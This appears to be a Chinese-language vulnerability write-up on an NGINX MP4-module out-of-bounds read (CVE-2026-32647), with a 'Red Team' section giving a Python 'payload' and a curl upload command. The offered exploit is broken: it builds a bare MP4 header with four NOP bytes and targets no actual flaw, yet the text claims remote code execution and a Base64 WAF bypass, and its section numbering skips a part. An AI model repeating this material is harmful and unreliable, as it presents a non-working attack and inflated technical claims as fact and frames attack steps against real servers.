# 🔥 解析 NGINX 記憶體越界讀取漏洞：CVE-2026-32647
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS 分數: 7.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `Out-of-bounds Read`, `MP4 檔案解析`, `ngx_http_mp4_module`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: NGINX 的 `ngx_http_mp4_module` 模組存在記憶體越界讀取問題，攻擊者可以透過特製的 MP4 檔案觸發記憶體錯誤，導致服務中斷，甚至進一步執行任意程式碼。
* **攻擊流程圖解**: 
    1. 攻擊者上傳特製的 MP4 檔案到 NGINX 伺服器。
    2. NGINX 的 `ngx_http_mp4_module` 模組嘗試解析 MP4 檔案。
    3. 由於記憶體越界讀取問題，NGINX 伺服器發生記憶體錯誤。
    4. 攻擊者可以利用這個錯誤執行任意程式碼。
* **受影響元件**: NGINX Plus 的 R32 至 R36 版，以及 NGINX Open Source 的 1.1.19 至 1.29.6 版。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有上傳檔案到 NGINX 伺服器的權限。
* **Payload 建構邏輯**:

    ```
    
    python
    import struct
    
    # 建構特製的 MP4 檔案
    mp4_file = b'\x00\x00\x00\x18'  # 文件大小
    mp4_file += b'\x66\x74\x79\x70'  # 文件類型
    mp4_file += b'\x6d\x70\x34\x32'  # 文件子類型
    mp4_file += b'\x00\x00\x00\x00'  # 保留
    mp4_file += b'\x00\x00\x00\x00'  # 保留
    
    # 將 Payload 添加到 MP4 檔案中
    payload = b'\x90\x90\x90\x90'  # NOP 指令
    mp4_file += payload
    
    # 上傳 MP4 檔案到 NGINX 伺服器
    
    ```
    *範例指令*: 使用 `curl` 上傳 MP4 檔案到 NGINX 伺服器。

```

bash
curl -X POST -H "Content-Type: video/mp4" -T mp4_file.mp4 http://example.com/upload

```
* **繞過技術**: 攻擊者可以使用 WAF 繞過技巧，例如使用 Base64 編碼的 Payload。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Out-of-bounds Read (記憶體越界讀取)**: 想像你正在讀取一本書，但是你讀到了書的最後一页以外的內容。技術上是指程式嘗試存取超出陣列或緩衝區的記憶體位置，導致記憶體錯誤或數據不一致。
* **MP4 檔案解析 (MP4 File Parsing)**: MP4 檔案是一種多媒體檔案格式，包含音頻和視頻資料。解析 MP4 檔案需要讀取檔案的結構和內容，包括檔案頭、音頻和視頻資料等。
* **ngx_http_mp4_module (NGINX MP4 模組)**: NGINX 的 MP4 模組是一個用於解析和處理 MP4 檔案的模組。它可以用於提供 MP4 檔案的下載和播放功能。
